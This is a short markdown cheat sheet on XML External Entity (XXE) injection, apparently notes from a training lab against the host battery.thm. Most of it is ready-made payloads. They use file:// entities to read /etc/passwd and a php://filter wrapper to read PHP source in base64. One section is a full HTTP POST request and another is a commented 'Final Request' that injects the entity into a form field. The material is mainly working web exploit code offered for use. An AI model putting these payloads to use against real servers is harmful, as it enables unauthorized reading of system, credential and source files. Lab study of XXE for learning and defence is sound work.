## XXE Reflection	
Is used when a website is placing a request with XML code. You want to check if the parsed code with reflect with a response.

1)Add xml code to retrive Passwd file in the start of the XML file
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
2)Add the same xxe in the search field
```
&xxe;
```
Example:
```
POST /forms.php HTTP/1.1
Host: battery.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 157
Origin: http://battery.thm
Connection: close
Referer: http://battery.thm/forms.php
Cookie: PHPSESSID=403g84fn66j1aj9m1p6aq83h17

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<root>
	<name>
	1
	</name>
	<search>
	&xxe;
	</search>
</root>

```


## Read a local file like etc/passwd//
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
<name> 1 </name>
<search> &xxe; </search>
</root

```

## Read a local phpfile//
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=acc.php"> ]>
<root>
<name> 1 </name>
<search> &xxe; </search>
</root
```
Example: (Base XML code)
```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>Hi there!!!</com>
</comment> 

Exploit to use:
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

Final Request:
```
<?xml version="1.0" encoding="UTF-8"?>

 <!DOCTYPE foo [  											--> Adding the XML code to the main XML in order ton read /etc/passwd
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>    --> Calling xxe variable that points to /etc/passwd on victim server
</comment> 
```